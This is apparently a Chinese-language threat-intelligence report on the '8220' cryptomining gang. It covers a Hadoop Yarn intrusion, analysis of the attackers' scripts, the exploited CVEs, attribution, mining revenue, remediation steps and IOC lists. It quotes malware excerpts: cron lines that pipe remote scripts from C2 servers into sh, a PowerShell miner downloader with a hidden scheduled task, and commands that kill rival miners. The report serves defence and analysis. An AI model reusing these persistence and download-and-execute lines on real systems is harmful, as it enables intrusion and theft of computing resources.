背景  

当今互联网的高速发展，孕育出了一批高新产业，如人工智能、分布式计算、区块链、无人驾驶等。这些高新技术为人们生活带来便利的同时，引发的安全问题也日益凸显。随着区块链技术的普及，其涉及的虚拟数字货币也创造了巨大的财富。这些虚拟货币可以通过“挖矿”的形式获取，“矿工”越多，利益越大。因此，近年来有越来越多的黑客团伙通过非法入侵控制互联网上的计算机并植入木马程序偷偷进行挖矿活动，为自己谋取暴利。

而在近期，360威胁情报中心根据某高校客户的反馈捕获到一批新的针对Linux平台的挖矿木马，而通过溯源关联分析发现这只是一个疑似国内来源的专业黑客团伙长期活动中的一部分。360威胁情报中心监测到该团伙在过去的一年非常活跃，使用了多个漏洞对网络中的服务器进行攻击：例如使用了WebLogic
XMLDecoder反序列化漏洞、Drupal的远程任意代码执行漏洞、JBosss反序列化命令执行漏洞、Couchdb的组合漏洞、Redis、Hadoop未授权访问漏洞等入侵互联网中的服务器并植入挖矿木马长期获利。在一系列的攻击活动中，我们发现该团伙的C2服务器统一使用8220号端口，因此360威胁情报中心将该团伙命名为“8220挖矿团伙”，并在后续的分析中以此代号对该团伙进行相关分析。

## 来源

近日，360威胁情报中心接到某高校客户反馈：最近几台用做分布式计算的服务器出现机器不稳定、卡顿、服务响应不及时等现象，他们通过对系统性能的检查，发现CPU利用率高达700%，这使得他们感到疑惑。360威胁情报中心协助用户对此事件进行了跟进分析，发现这是一起攻击者利用Hadoop
Yarn资源管理系统REST API未授权漏洞对服务器进行攻击并植入了最新的门罗币挖矿木马进行挖矿的安全事件。

### 问题排查

在获得客户同意后，360威胁情报中心研究人员对存在问题的Linux服务器进行了远程排查，发现攻击者是通过未打补丁的Hadoop
Yarn资源管理系统入侵服务器的。进一步排查后获取到一个最新的Linux挖矿木马，排查过程如下。（怀疑自己中了同类挖矿木马的用户，可以使用如下命令进行自检，清理方案详见安全建议一节。）

l 首先执行$ top命令，检查系统运行状态，此台Linux服务器的CPU利用率为732%

  

![image.png](https://image.3001.net/images/20180807/1533610279_5b6909275d50d.png!small)

l 再执行$ ps aux |grep [pid]命令，定位到可疑的挖矿木马文件，位于/var/tmp/目录下

  

![image.png](https://image.3001.net/images/20180807/1533610290_5b690932a5f47.png!small)

l 继续执行$
hadoopversion命令，检查Hadoop版本，当前Linux服务器上安装的Hadoop版本号为2.6.0（此版本支持认证服务，但若未开启，攻击者则可通过Hadoop
Yarn资源管理系统REST API未授权漏洞入侵系统）

  

![image.png](https://image.3001.net/images/20180807/1533610304_5b6909407dfb5.png!small)

l 执行$ crontab-u yarn -l命令，检查任务计划，yarn用户每分钟向C2地址发起请求，获取最新脚本文件

  

![image.png](https://image.3001.net/images/20180807/1533610315_5b69094ba58d5.png!small)

l 执行$
head/var/log/cron-20180617命令（实际操作中需要查看对应的日志文件），检查任务计划日志，发现挖矿木马在6月10日替换过C2地址

![image.png](https://image.3001.net/images/20180807/1533610330_5b69095ae3d9e.png!small)  

通过上述操作，我们定位到了此次事件中的门罗币挖矿木马程序和核心控制脚本，并进行了详细分析，分析情况见样本分析一节。

## 攻击植入过程分析

通过对其中某台服务器检查，360威胁情报中心初步判定攻击者利用了Hadoop Yarn REST
API未授权漏洞入侵了这些服务器，从而植入挖矿木马实现获利：

360威胁情报中心分析了整个攻击植入流程如下：

![6.png](https://image.3001.net/images/20180807/1533610382_5b69098e6f789.png!small)  

## 样本分析

### 相关样本

我们将此次事件中挖矿木马的核心文件以列表的形式整理如下，并逐一进行分析：

**文件名** |  **MD5** |  **作用**  
---|---|---  
cr.sh  |  1f6554f2559d83ace7f0af82d32beb72  |  Shell脚本，用于下载挖矿程序和配置文件  
x_64  |  7f4d9a672bb7ff27f641d29b99ecb08a  |  64位ELF挖矿程序  
x_32  |  b00f4bbd82d2f5ec7c8152625684f853  |  32位ELF挖矿程序  
w.conf  |  |  配置文件，保存钱包地址，矿池地址  
  
#### 样本分析--cr.sh核心脚本

攻击者利用YARN默认开放的8088端口服务，向服务器提交恶意作业，该作业包含远程下载并执行Shell脚本的命令。下载回来的脚本cr.sh完成如下功能：

1、 清理主机环境：停止、删除主机已经存在的其他挖矿程序

2、 检查主机环境：检查指定的挖矿程序是否已经存在

3、 配置主机环境：下载挖矿程序和配置文件并执行

4、 持续感染主机：设置任务计划，保持更新，持续感染主机

5、 清理任务计划：清除其他挖矿相关的任务计划

清理主机环境代码片段：结束当前主机正在运行的其他已知挖矿程序并删除，已知挖矿程序的文件名如pscf、ntpd、ntp、qq、qq1等：

    
    
    ...
    
    
    ps ax | grep 'wc.conf\|wq.conf\|wm.conf\|wt.conf' | grep -v grep | grep 'ppl\|pscf\|ppc\|ppp' | awk '{print $1}' | xargs kill -9
    
    
    rm -rf /var/tmp/pscf*
    
    
    rm -rf /tmp/pscf*
    
    
    pkill -f ririg
    
    
    rm -rf /var/tmp/ntpd
    
    
    pkill -f /var/tmp/ntpd
    
    
    rm -rf /var/tmp/ntp
    
    
    pkill -f /var/tmp/ntp
    
    
    rm -rf /var/tmp/qq
    
    
    rm -rf /var/tmp/qq1
    
    
    pkill -f /var/tmp/qq
    
    
    rm -rf /tmp/qq
    
    
    rm -rf /tmp/qq1
    
    
    pkill -f /tmp/qq
    
    
    pkill -f /var/tmp/aa
    
    
    rm -rf /var/tmp/aa
    
    
    ...

核心功能代码片段：代码会先检查本地挖矿程序是否已经存在，如果不存在则调用downloadIfNeed函数，该函数会检查并下载最新的挖矿程序和配置文件。downloadIfNeed函数执行完成之后，会利用nohup命令后台执行挖矿程序，同时删除配置文件，防止泄漏个人钱包地址，矿池地址等：

    
    
    ...
    
    
    if [ ! "$(ps -fe|grep '/tmp/java'|grep 'w.conf'|grep -v grep)" ];
    
    
    then
    
    
        downloadIfNeed
    
    
        chmod +x $DIR/java
    
    
        $WGET $DIR/w.conf https://raw.githubusercontent.com/ffazop1/mygit/master/w.conf
    
    
        nohup $DIR/java -c $DIR/w.conf > /dev/null 2>&1 &
    
    
        sleep 5
    
    
        rm -rf $DIR/w.conf
    
    
    else
    
    
        echo "Running"
    
    
    fi
    
    
    ...

任务计划相关代码片段：代码会检查当前任务计划中，是否存在46.249.38.186地址，如果没有，则会写入利用curl或者wget下载并执行cr.sh脚本的任务计划，同时会调用pkill命令结束其他已知的挖矿进程、清理其他挖矿脚本的任务计划：

    
    
    ...
    
    
    if crontab -l | grep -q "46.249.38.186"
    
    
    then
    
    
        echo "Cron exists"
    
    
    else
    
    
        echo "Cron not found"
    
    
        LDR="wget -q -O -"
    
    
        if [ -s /usr/bin/curl ];
    
    
        then
    
    
            LDR="curl";
    
    
        fi
    
    
        if [ -s /usr/bin/wget ];
    
    
        then
    
    
            LDR="wget -q -O -";
    
    
        fi
    
    
        (crontab -l 2>/dev/null; echo "* * * * * $LDR http://46.249.38.186/cr.sh | sh > /dev/null 2>&1")| crontab -    
    
    fi
    
    
     
    
    
    pkill -f logo4.jpg
    
    
    pkill -f logo0.jpg
    
    
    pkill -f logo9.jpg
    
    
    pkill -f jvs
    
    
    pkill -f javs
    
    
    pkill -f 192.99.142.248
    
    
    rm -rf /tmp/pscd*
    
    
    rm -rf /var/tmp/pscd*
    
    
    crontab -l | sed '/192.99.142.232/d' | crontab -    
    
    crontab -l | sed '/192.99.142.226/d' | crontab -    
    
    crontab -l | sed '/192.99.142.248/d' | crontab -    
    
    crontab -l | sed '/45.77.86.208/d' | crontab -    
    
    ...

#### 样本分析--挖矿程序

**文件名** |  **MD5** |  **版本号** |  **编译时间**  
---|---|---|---  
x_64  |  7f4d9a672bb7ff27f641d29b99ecb08a  |  2.6.2  |  20180624  
x_32  |  b00f4bbd82d2f5ec7c8152625684f853  |  2.5.2  |  20180520  
  
cr.sh脚本中内置了两个挖矿程序的MD5，如果当前主机中的挖矿程序MD5不在这两个MD5中，则cr.sh会从指定的服务器上下载对应的挖矿程序。

通过360威胁情报中心大数据分析平台，我们获取到这两个MD5对应对文件。经过简单分析，这两个文件分别为Linux下的32位和64位挖矿程序，并且都是基于XMRig[2]开源挖矿工具修改的。挖矿程序支持如下命令：

  

![image.png](https://image.3001.net/images/20180807/1533610435_5b6909c314d7e.png!small)

32位挖矿程序基于XMRig2.5.2版本修改，2016年编译生成，程序中内置1个钱包地址：48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD，属于开源挖矿软件作者，用于抽水。

64位挖矿程序基于XMRig2.6.2修改，2017年编译生成，程序中内置两个钱包地址，一个属于开源软件作者，另一个钱包地址：46CQwJTeUdgRF4AJ733tmLJMtzm8BogKo1unESp1UfraP9RpGH6sfKfMaE7V3jxpyVQi6dsfcQgbvYMTaB1dWyDMUkasg3S，则可定位到开源项目cpuhunter[3]。

#### 样本分析--w.conf配置文件

cr.sh脚本同时会从指定的服务器上下载挖矿配置文件，作为参数传递给挖矿程序，并在挖矿开始后删除该配置文件，保证隐私性。我们通过配置文件中的钱包地址和矿池地址信息关联到了“8220挖矿团伙”大量利用服务器漏洞进行入侵挖矿的攻击事件，详见溯源与关联一节。

### C2信息

本次事件中，攻击者使用了Github作为云分发平台，保存挖矿程序和配置文件。360威胁情报中心数据平台显示，该攻击者会不定期的创建删除Github账号，保证可用性及隐私性。

已使用的Github账户名（均已删除）：

l ffazop1

l zzgamond1

Github项目地址（均已删除）：

l https://raw.githubusercontent.com/ffazop1/mygit/master/w.conf

l https://raw.githubusercontent.com/ffazop1/mygit/master/x_64

l https://raw.githubusercontent.com/zzgamond1/mygit/master/w.conf

l https://raw.githubusercontent.com/zzgamond1/mygit/master/x_64

## 溯源与关联

使用360威胁情报中心数据分析平台对此次事件中出现的文件、IP地址、端口、关键字、钱包地址、MD5等进行关联分析，我们跟踪到一个疑似国内来源的挖矿黑客团伙，在该团伙所有的挖矿攻击活动中都拥有以下共同特点，使得360威胁情报中心将这些挖矿攻击事件全部关联到同一伙人身上：

l **端口关联**

在多起事件中，出现的C2服务器统一使用8220号端口，因此我们可将其作为身份识别的一个弱特征。

l **文件名关联**

在多起事件中，重复使用了相同的文件名，例如1.ps1、2.ps1、logo0.jpg、logo2.jpg、logo3.jpg、logo4.jpg、logo7.jpg等，因此我们也将其作为身份识别的一个弱特征。

l **钱包地址关联**

从同一个C2上，我们获取到该团伙不同时期使用的两个脚本，这两个脚本包含了两个不同的门罗币钱包地址，并且这两个钱包地址在这些事件中都有使用。考虑钱包的私有特性，我们可将其作为身份识别的一个强特征。

且通过大数据分析显示，该团伙已经存在很长时间，并且在过去一年中异常活跃，在几起曝光的严重漏洞攻击事件中，都有该团伙的身影。另外从关联的信息中，我们发现该团伙的挖矿活动涉及Linux和Windows平台。种种迹象表明，该团伙不断在积累自身的网络攻击武器库，以支撑他们对网络中存在漏洞的主机进行自动化的攻击，最终拿下主机并实现挖矿的目的。

并且360威胁情报中心推测该团伙是利用Docker进行C2服务器自动化部署工作，导致这些C2统一使用8220号端口与木马进行通信。因此 **360**
**威胁情报中心将该团伙命名为“ 8220** **挖矿团伙”** ：

  

![image.png](https://image.3001.net/images/20180807/1533610479_5b6909ef48349.png!small)

运行在C2服务器8220端口上的Apache服务

### 攻击活动时间线

通过对关联信息的整理归纳，我们绘制了过去一年与该团伙相关的攻击活动的时间图：

  
![9.png](https://image.3001.net/images/20180807/1533610493_5b6909fd4b884.png!small)  

活动图中的时间顺序仅为我们发现该团伙最早的活动时间，并不表示该团伙只在此时间段利用此漏洞。相应的，此图直观体现了该团伙积累了较多的网络攻击武器。我们有理由相信，还有大量关于该团伙的未被曝光的攻击事件。

### 攻击手法

360威胁情报中心将溯源关联到的“8220挖矿团伙”近年来所有的攻击事件和攻击手法逐一进行分析。我们详细介绍其中的两类漏洞利用相关的攻击事件，其他的以列表的形式整理在后文。

### WebLogic漏洞攻击事件（清理同类挖矿木马保证一家独大）

通过360威胁情报中心数据平台，我们发现了一起利用WebLogic漏洞进行入侵服务器并进行挖矿的攻击活动。在此活动中，攻击者使用了相同的钱包地址，因此我们也将其确定为“8220挖矿团伙”所为。

攻击者利用WebLogicXMLDecoder反序列化漏洞（编号CVE-2017-10271[4]）攻击服务器，并获取服务器控制权限，进而植入挖矿木马进行挖矿。该漏洞出现在WebLogic
Server Security Service中，影响WebLogic
Server12.2.1.2.0及其之前的版本。利用此漏洞，攻击者下载名为2.ps1的PowerShell脚本并执行。脚本进而会下载挖矿木马程序，进行挖矿活动。同时，该脚本也会终止其他挖矿程序运行，保证自己独占CPU资源。

PowerShell脚本会从192.99.142.232:8220服务器下载xmrig.exe挖矿程序，以yam.exe的文件名保存在本地，通过cmd.exe启动挖矿程序，同时传入矿池地址，钱包地址，密码信息：

    
    
    $ne = $MyInvocation.MyCommand.Path
    
    
    $nurl = "http://192.99.142.232:8220/xmrig.exe"
    
    
    $noutput = "$env:TMP\yam.exe"
    
    
    $vc = New-Object System.Net.WebClient
    
    
    $vc.DownloadFile($nurl,$noutput)
    
    
    copy $ne $HOME\SchTask.ps1
    
    
    copy $env:TMP\yam.exe $env:TMP\pe.exe
    
    
     
    
    
    SchTasks.exe /Create /SC MINUTE /TN "Update service for Oracle productsa" /TR "PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noexit -File 
    
    
    ...
    
    
    cmd.exe /C taskkill /IM 360rps.exe /f
    
    
    cmd.exe /C $env:TMP\pe.exe --donate-level=1 -k -a cryptonight -o stratum+tcp://monerohash.com:5555 -u 41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo -p x

### Drupal漏洞利用

通过对C2地址的深度挖掘，我们发现一篇今年4月国外安全厂商发布的报告[5]。报告中提到了两种利用Drupal远程任意代码执行漏洞（编号CVE-2018-7600[6]）的挖矿木马程序，通过钱包地址的关联，确定其中一种挖矿木马也是“8220挖矿团伙”所拥有。

而Drupal的远程任意代码执行漏洞是由于Drupal对表单的渲染引起的。为了能够在表单渲染对过程中动态修改数据，Drupal引入了“Drupal
Render API”机制[7]，“Drupal Render
API”对于#会进行特殊处理，其中#pre_render在render之前操作数组，#post_render接收render的结果并在其添加包装，#lazy_builder用于在render过程的最后添加元素。由于对于部分#属性数组值，Drupal会通过call_user_func的方式进行处理，导致任意代码执行。漏洞验证POC[8]，利用此POC可快速验证Drupal是否存在该漏洞。

“8220挖矿团伙”利用此漏洞下载并执行挖矿程序。其中的Shell恶意脚本代码将wget -q
http://192.99.142.235:8220/logo4.jpg -O - |
sh命令写入任务计划，实现对服务器的持续感染。同时从192.99.142.235:8220下载配置文件3.json和挖矿程序rig，分别保存为config.json和sustes，最后利用nohup命令在后台运行挖矿。

    
    
    ...
    
    
    crontab -r || true && \
    
    
    echo "* * * * * wget -q http://192.99.142.235:8220/logo4.jpg -O - | sh" >> /tmp/cron || true && \
    
    
    crontab /tmp/cron || true && \
    
    
    rm -rf /tmp/cron || true && \
    
    
    wget -O /var/tmp/config.json http://192.99.142.235:8220/3.json
    
    
    wget -O /var/tmp/sustes http://192.99.142.235:8220/rig
    
    
    chmod 777 /var/tmp/sustes
    
    
    cd /var/tmp
    
    
    proc=`grep -c ^processor /proc/cpuinfo`
    
    
    cores=$((($proc+1)/2))
    
    
    num=$(($cores*3))
    
    
    /sbin/sysctl -w vm.nr_hugepages=`$num`
    
    
    nohup ./sustes -c config.json -t `echo $cores` >/dev/null &
    
    
    ...

### 其它漏洞利用列表

**服务** |  **利用说明**  
---|---  
JBosss |
利用JBosss反序列化命令执行漏洞（编号CVE-2017-12149[9]），漏洞影响5.X和6.X版本。利用此漏洞可在未经任何身份验证的服务器主机上执行任意代码。”8220挖矿团伙”利用此漏洞下载并执行PowerShell脚本，进行挖矿活动。  
Couchdb  |  利用Couchdb的组合漏洞（编号CVE-2017-12635[10],
CVE–2017–12636[11]）。利用CVE-2017-12635漏洞，可以给自身添加管理员权限；利用CVE-2017-12636，可以实现远程任意代码执行。”8220挖矿团伙”利用这两个漏洞完成对目标的攻击，进行挖矿活动。  
Redis  |
Redis默认情况下运行在0.0.0.0:6379上。若Redis服务暴露在公网，同时没有开启认证，则攻击者可以在未授权的情况下访问Redis服务，执行恶意操作。”8220挖矿团伙”通过网络扫描工具，发现存在该漏洞的主机，并进行攻击，实现挖矿活动。  
Hadoop Yarn  |  Yarn的ResourceManager
UI默认运行在0.0.0.0:8088端口上，允许用户通过接口进行相关的应用创建、任务提交执行等操作。若该服务暴露在公网，同时没有开启认证，则攻击者可以在未授权访问的情况下执行恶意操作。”8220挖矿团伙”利用此漏洞进行远程命令执行，实现挖矿活动。  
Kubernetes  |
Kubelet默认开启10255和10250端口，攻击者可以在未授权的情况下执行恶意操作。”8220挖矿团伙”利用该漏洞，远程执行下载脚本的命令，实现在容器中的挖矿活动。  
  
### Docker镜像利用

360威胁情报中心还发现国外一篇关于Docker
Hub镜像的安全研究报告[12]中，疑似出现“8220挖矿团伙”的身影。报告指出，从2017年05月注册账号开始，到2018年05月删除账号结束，该账号陆续上传了17个恶意docker镜像，镜像下载量达到500万次以上。这些镜像的功能大致可分为如下四类：

1、 反弹主机的SHELL

2、 向主机中添加SSH公钥

3、 在主机中添加任务计划

4、 利用镜像完成挖矿

通过对报告中出现的钱包信息，C2信息等，结合360威胁情报中心数据平台关联的同一时间段信息，我们确定此账号为“8220挖矿团伙”所拥有。更加证实了我们关于这是一支专业挖矿团伙的判定。

## “8220挖矿团伙”挖矿信息统计

360威胁情报中心统计了“8220挖矿团伙”近年来所有攻击活动中常用的钱包信息、收益状况等如下。

### 钱包信息

#### 钱包1

l 钱包地址：

41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo

l Monerohash上的有效期：? -- 2018/5/08

l 总收益：90.1934XMR（仅Monerohash公开矿池）

l 交易记录截图

  

![10.png](https://image.3001.net/images/20180807/1533610513_5b690a11c6876.png!small)

#### 钱包2

l 钱包地址：

4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg

l Monerohash上的有效期：2018/5/15 -- 今

l 总收益：140.3400XMR（仅Monerohash公开矿池）

l 交易记录截图

  

![11.png](https://image.3001.net/images/20180807/1533610525_5b690a1d9209b.png!small)

  

![12.png](https://image.3001.net/images/20180807/1533610547_5b690a333af3a.png!small)

### 收益汇总及评估

仅看Monerohash公开矿池的交易记录，“8220挖矿团伙”累计获取超过230枚门罗币。其中，钱包2提供的算力高达365KH/sec，占Monerohash矿池算力的7%左右。做个简单估算，以INTELCORE
I5-2400处理器作为参考，核心全开的情况下算力大约在70H/sec左右，那么相当于大约有5200台服务器在同一时间为该团伙进行挖矿。

通过查询其他相关公开矿池的交易记录，此团伙累计获取超过1000枚门罗币，按照市价974元/枚计算，其价值将近100万元人民币。考虑还有未统计的公开矿池及无法查询的私有矿池，
**保守估计该团伙累计获益已达数百万** 。

### 钱包信息关联

从以上交易截图中可观察出，“8220挖矿团伙”前期使用的钱包1在今年4月时，被安全厂商标注为Botnet，各大公开矿池也将其列入黑名单，禁止接入挖矿。此后，该团伙使用了另一个钱包2，在大型矿池挖矿，并持续至今。

## 攻击者画像-疑似国内团伙

我们对涉及的样本做了简单的统计如下：

**配置文件使用过的名称：**

l w.conf、dd1.conf、gg1.conf、test.conf、tes.conf、hh1.conf

l **kkk1.conf** 、 **ttt1.conf** 、ooo1.conf、 **ppp1.conf**

**挖矿程序使用过的名称：**

l nginx、suppoie、java、mysql、cpu.c、ntpd、psping、java-c、pscf、

l cryptonight、sustes、xmr-stak、ririg、ntp、 **qq** 、 **aa** 、ubyx

l logo4.jpg、logo0.jpg、logo9.jpg

l **apaqi** 、 **dajiba** 、look、orgfs、crant、jvs、javs

通过对相关样本的统计分析，结合其具有中文特色命名的特点、交易发生的时间（统计分析主要集中在UTC+8时区）及其他一些信息，我们怀疑这是一支来源于国内的挖矿团伙。360威胁情报中心后续将继续跟进该团伙，采集更多信息对其进行全方位网络画像。

## 总结及安全建议

针对此次高校服务器挖矿事件中出现的恶意样本，360威胁情报中心建议用户使用如下步骤检测及清理疑似中招的服务器：

1、 使用top查看进程，KILL掉异常进程

2、 检查/var/tmp目录，删除java、pscf3、w.conf等异常文件

3、 检查crontab任务列表，删除异常任务

4、 检查YARN日志，删除异常的Application ID

5、 开启Hadoop Kerberos认证服务

而对于日益严重的入侵网络服务器植入挖矿木马的攻击事件（现阶段几乎是黑客团伙最喜欢的攻击获利方式之一），360威胁情报中心建议企业客户尽量做好以下防范措施：

l 定期对服务器进行加固，尽早修复服务器相关安全漏洞，如有条件务必安装服务器端的安全软件

l 当发现主机存在挖矿木马时，务必立即进行全方位的检查，必要时请联系专业的安全公司进行协助处理

l 关注360威胁情报中心更新的最新安全通告，对相应的安全威胁及时进行排查

目前，基于360威胁情报中心的威胁情报数据的全线产品，包括360威胁情报平台（TIP）、天眼高级威胁检测系统、360
NGSOC等，都已经支持对此挖矿团伙攻击活动的实时检测和相关未知攻击的预警。

## IOC

### 矿池地址及C2

**IP** |  **说明**  
---|---  
158.69.133.20:3333  |  私有矿池地址  
192.99.142.249:3333  |  私有矿池地址  
202.144.193.110:3333  |  私有矿池地址  
192.99.142.232:8220  |  C2  
192.99.142.235:8220  |  C2  
192.99.142.226:8220  |  C2  
192.99.142.246:8220  |  C2  
192.99.142.248:8220  |  C2  
158.69.133.18:8220  |  C2  
198.181.41.97:8220  |  C2  
46.249.38.186  |  C2  
  
### 相关样本

**样本MD5** |  **说明**  
---|---  
b00f4bbd82d2f5ec7c8152625684f853  |  32位ELF挖矿程序  
183664ceb9c4d7179d5345249f1ee0c4  |  64位ELF挖矿程序  
4fa4269b7ce44bfce5ef574e6a37c38f  |  64位ELF挖矿程序  
52c748513583aa573d3649f701db61b2  |  64位ELF挖矿程序  
54b0f140da40e5713377f4d4a8f143ad  |  64位ELF挖矿程序  
7f4d9a672bb7ff27f641d29b99ecb08a  |  64位ELF挖矿程序  
b245362aa364f94496380cfd2f002493  |  64位ELF挖矿程序  
c644c04bce21dacdeb1e6c14c081e359  |  64位ELF挖矿程序  
c8c1f2da51fbd0aea60e11a81236c9dc  |  64位ELF挖矿程序  
d0874ba34cfbdf714fcf2c0a117cc8e2  |  64位ELF挖矿程序  
ea6500b759ab46fb5e8fc6ebac03a605  |  64位ELF挖矿程序  
fa7a3c257428b4c7fda9f6ac67311eda  |  64位ELF挖矿程序  
3ed4adb65428f2c8ab75e60c3cebc9fa  |  64位EXE挖矿程序  
6b33c34623f3051a996f38e536d158af  |  64位EXE挖矿程序  
b3a831bfa590274902c77b6c7d4c31ae  |  64位EXE挖矿程序  
014b3d382eee186758b52e22ee13f3f8  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
03744545ccda5d06171273253c590a0b  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
0c95e09417764caf3b7ba3d6d9a066b0  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
0ca338869d304db50a0fae160b9f1074  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
0ee6730d50ad5093f673840d647472b4  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
0f5337d8d9c90f3b5e541674ff154586  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
1535bb790378111e5909713e9ec3592f  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
1b07503b10e6e42e40262c581a3bbd7c  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
1b8ba726ec2a06edf3966c43cfb0b764  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
1b99c8c3df90a1f1b25759a71b9db82f  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
1ce819f4f5c79f5450d248f606435ad8  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
1ec712bd868c76e721bc09a0688aebf8  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
1f0bb2a26c4ef0df865cdc6d4e568a89  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
1f159b9b758827f87fbf47e6f40a8cf7  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
1f616fc858de6ff490f41c70cacc1520  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
20908240df66707eaf8f54e91ae87cdd  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
22bbdffe5a4dffe4042daea6ff2d01b7  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
23e594e0174c74516017e95fff1c58a9  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
23fb5e0ad71601c561276c4cde9652ea  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
24ef2192dbc0ae9e97b9e0834f7e81c3  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
2f7880878a13e159c7e9101f5697bb6b  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
30dcc9621875a7af3c098fd30bb80312  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
354ec95034bd94cbf2eb79a472ce7c0d  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
36fbb9d3dc0010f726f748c289810dff  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
386b9509c931198c39f3171da1a9c510  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
38d20175bdf9986ee02181c15481741a  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
3cb03701dc0c15a0989d54830d651443  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
3f0b8e298ad3cba12ecc1e5f602651e5  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
417062ba22213167047bc30156a4b4b0  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
46dc656201f59669646535edece25da4  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
4a71e9f08ef1bf77ba30f44ac9558fe3  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
53ee3809cabd327403ef858252cdbe78  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
5934d5ffe24db9300a59af31cc07cdff  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
5ac4f6aaaeabcee559da4928d185490e  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
5d48329667c089b04cc211765617f4fc  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
5edb31d74372c79d5e555ea2e954eaca  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
669d300909abca282e7bdc9c7b6f3bb6  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
6e49abda38340231d79da934509fafe4  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
76205e10a8f1a038cee14e3626f77454  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
7a669eb1c299e1632d0a3f879781dc5c  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
7a7e788f2bfe8cd8a4def0225a8e2168  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
7c01fdf27193763d8d5dc6fd5d4594a9  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
8150c3588a0aed85847aae976242a1d4  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
822f2a98c8389103c9e3692fcadec9ae  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
86e896b12d905d2069c8369e9fc47c26  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
900cc2b750007fec06e32b2acd04b880  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
907a11aaa5a020e89f44e8696040e738  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
90838725f9e8abfebf8936c69026db61  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
91284eeb0e232845f067746883c2b460  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
93b0f438886ce29109a57086d4ecc2e5  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
9695151a172f31ea7a0895d83da3891d  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
9aa4584d4b6f3bc8e5f2a1fac3d2fe95  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
9ae5cf3d0454641e4cc4ee55c79ad6a5  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
9b30566971ac7bd7696f9782445d1971  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
9d2e09745ed642c1d1be4f2cb82b9d14  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
a1035c8aab177986ad605732577d87d8  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
a206f764510149eb3a41f8a78c098673  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
a2bdc466dced6f2597968cb53e9972e0  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
a38c6cbfeffb95dc693660c7d4b52999  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
a748e59e064d8683620857c6a412f446  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
a836250acb9bce43d4cd8612a11ef5d8  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
aaba0654448c49814cbf035bd1c01d48  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
b07aaddfb97614100978fa78b33bf224  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
b18bc898e41645cef90764d102a0365c  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
b54110a68d9fabf313ea3ea13939b37c  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
be8d8ca9f8b5e1e44a77c9ecdddce995  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
